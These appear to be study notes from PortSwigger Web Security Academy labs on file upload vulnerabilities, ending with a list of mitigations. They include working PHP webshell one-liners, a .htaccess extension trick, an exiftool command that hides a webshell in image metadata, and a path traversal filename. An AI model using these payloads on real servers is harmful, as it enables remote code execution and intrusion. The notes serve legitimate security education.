
# File Upload Vulnerabilities

> PortSwigger Web Security Academy  Web Exploitation Notes

---

## Overview

File upload vulnerabilities occur when a server allows users to upload files without properly validating name, type, contents, or size. Exploiting these can lead to remote code execution, path traversal, or server-side file overwrites.

---

## Exploitation Techniques

### 1. Content-Type Manipulation

The `Content-Type` response header often reveals what file type the server expects. If the application doesn't explicitly set this header, it defaults to the file extension/MIME type mapping.

If the server only validates the `Content-Type` of the POST request (and not the actual file contents), you can intercept the request in Burp Suite and change the content type to an allowed one.

**Useful Burp workflow:**
- Upload a malicious file
- Intercept with Burp Suite
- Modify the `Content-Type` header to a permitted MIME type (e.g., `image/jpeg`)
- Forward the request

---

### 2. PHP Webshells

Once a `.php` file is successfully uploaded and executed, you can interact with the server.
```php
# Remote command execution
<?php echo system($_GET['command']); ?>

# File read
<?php echo file_get_contents('/path/to/target/file'); ?>
```

---

### 3. Bypassing Blacklisted Extensions

When common extensions like `.php` are blocked:

**a) `.htaccess` Abuse**

Upload a `.htaccess` file to configure the directory to treat a custom extension as PHP:
```apache
AddType application/x-httpd-php .shell
```

Then upload your webshell with a `.shell` extension  it won't be caught by the blacklist but will execute as PHP.

**b) Exiftool Comment Injection**

If the server validates file contents, embed the payload inside the metadata/comment of a legitimate image:
```bash
exiftool -Comment='<?php echo system($_GET["cmd"]); ?>' image.jpg
```

Then upload it with a `.php` extension (e.g., `image.php`).

---

### 4. Execution Blocked  Use Path Traversal

If the server is configured to prevent execution of uploaded files from the upload directory, use path traversal in the filename to land the file somewhere executable:
```
filename="../../var/www/html/shell.php"
```

---

### 5. No Upload Option? Try PUT

Check if the server supports the `PUT` method by sending an `OPTIONS` request:
```
OPTIONS /upload-dir/ HTTP/1.1
```

If `PUT` is listed in the `Allow` response header, you may be able to upload files directly without a form.

---

### 6. Race Condition

If you can get your hands on the sanitization code, check for a race condition  there may be a window between upload and validation where you can trigger execution before the file gets moved or deleted.

---

## Mitigations

- **Whitelist extensions**  allow only explicitly permitted types rather than trying to block known bad ones
- **Sanitize filenames**  strip traversal sequences like `../` before saving
- **Rename on upload**  use a random/hashed filename to avoid collisions and overwrites
- **Delay persistence**  don't write to permanent storage until all validation has passed
- **Use established frameworks**  don't roll your own validation logic

---

*Lab source: PortSwigger Web Security Academy*
